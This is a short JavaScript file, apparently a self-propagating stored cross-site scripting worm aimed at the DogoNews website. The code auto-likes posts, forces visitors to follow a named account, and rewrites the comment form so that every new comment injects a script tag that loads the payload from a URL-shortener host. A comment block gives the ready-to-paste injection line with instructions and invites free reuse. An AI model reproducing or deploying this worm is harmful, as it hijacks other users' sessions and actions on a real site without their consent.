
$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
var p='<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>'; //Assign Payload into var for further spread
var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
myPopup.addEventListener('load', window.close, false); //close window when finished
window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
$('input[value$=Post]').first().attr('type','button').attr('onclick','var k=$(\'textarea#comment_body.text.required.form-control\').first();var f=k.val();k.val(f+p);k.parent().parent().parent().submit();'); //Automatic Inject to next comment
/*
Breaks Any DogoNews page:
<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
Just comment it with a message after and watch the magic!

--Signature--
Origional Author:
@HacksNeedFatKids#9617 on Discord
12 Years of age.
Author Currently:
@HacksNeedFatKids#9617 on Discord
12 Years of age.


This code is free to use free of charge. You can share it, Copy it & re upload it.
Just make sure that this signature is kept.
--Credits--
My Friend Seth, For trying to get people to follow him on DogoNews
My Friend Josh, For telling me Seth's goal
Me, For writing the source :D
*/
